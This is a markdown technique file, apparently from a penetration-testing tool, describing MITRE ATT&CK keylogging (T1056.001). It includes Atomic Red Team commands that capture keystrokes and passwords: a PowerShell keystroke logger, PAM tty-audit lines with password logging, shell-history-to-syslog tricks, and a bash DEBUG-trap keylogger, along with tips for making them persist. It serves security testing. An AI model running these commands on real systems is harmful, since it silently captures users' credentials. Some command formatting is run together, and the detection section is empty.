---
name: "T1056.001_keylogging"
description: "Adversaries may log user keystrokes to intercept credentials as the user types them."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1056.001
  - collection
  - credential-access
  - linux
  - macos
  - network-devices
  - windows
  - sub-technique
technique_id: "T1056.001"
tactic: "collection"
all_tactics:
  - collection
  - credential-access
platforms:
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1056/001"
tech_stack:
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1056
  - T1056.002
  - T1056.003
  - T1056.004
prerequisites:
  - T1056
severity_boost:
  T1056: "Chain with T1056 for deeper attack path"
  T1056.002: "Chain with T1056.002 for deeper attack path"
  T1056.003: "Chain with T1056.003 for deeper attack path"
---

# T1056.001 Keylogging

> **Sub-technique of:** T1056

## High-Level Description

Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:

- Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.
- Reading raw keystroke data from the hardware buffer.
- Windows Registry modifications.
- Custom drivers.
- Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.

## Kill Chain Phase

- Collection (TA0009)
- Credential Access (TA0006)

**Platforms:** Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Keylogging technique is applicable to target environment
- [ ] Check Linux systems for indicators of Keylogging
- [ ] Check macOS systems for indicators of Keylogging
- [ ] Check Network Devices systems for indicators of Keylogging
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Input Capture

Utilize PowerShell and external resource to capture keystrokes
[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
&"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath #{filepath}
```

**Dependencies:**

- Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1

### Atomic Test 2: Living off the land Terminal Input Capture on Linux with pam.d

Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log. All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.

Passwords hidden by the console can also be logged, with 'log_passwd' as in this example. If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=\*' as the initial command).

Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary. Mac OS does not currently contain the pam_tty_audit.so library.

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
sudo touch /tmp/password-auth.bk
sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
enable=* log_password" >> /etc/pam.d/system-auth
```

**Dependencies:**

- Checking if pam_tty_audit.so is installed

### Atomic Test 3: Logging bash history to syslog

There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable "if set" will be executed before the PS1 variable and can be configured to write the latest "bash history" entries to the syslog.

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
tail /var/log/syslog
```

**Dependencies:**

- This test requires to be run in a bash shell and that logger and tee are installed.

### Atomic Test 4: Logging sh history to syslog/messages

There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable "if set" will be executed before the PS1 variable and can be configured to write the latest "bash history" entries to the syslog.

To gain persistence the command could be added to the users .shrc or .profile

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
PS2=`logger -t "$USER" -f ~/.sh_history`
$PS2
tail /var/log/messages
```

**Dependencies:**

- This test requires to be run in a bash shell and that logger and tee are installed.

### Atomic Test 5: Bash session based keylogger

When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = "echo $BASH_COMMAND". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger.

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/

**Supported Platforms:** linux

```bash
trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
echo "Hello World!"
cat #{output_file}
```

**Dependencies:**

- This test requires to be run in a bash shell

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Keylogging by examining the target platforms (Linux, macOS, Network Devices).

2. **Assess Existing Defenses**: Review whether mitigations for T1056.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Behavioral Detection of Keylogging Activity Across Platforms

## Risk Assessment

| Finding                         | Severity | Impact     |
| ------------------------------- | -------- | ---------- |
| Keylogging technique applicable | High     | Collection |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [Talos Kimsuky Nov 2021](https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html)
- [Cisco Blog Legacy Device Attacks](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)
- [Adventures of a Keystroke](http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf)
- [Atomic Red Team - T1056.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1056.001)
- [MITRE ATT&CK - T1056.001](https://attack.mitre.org/techniques/T1056/001)
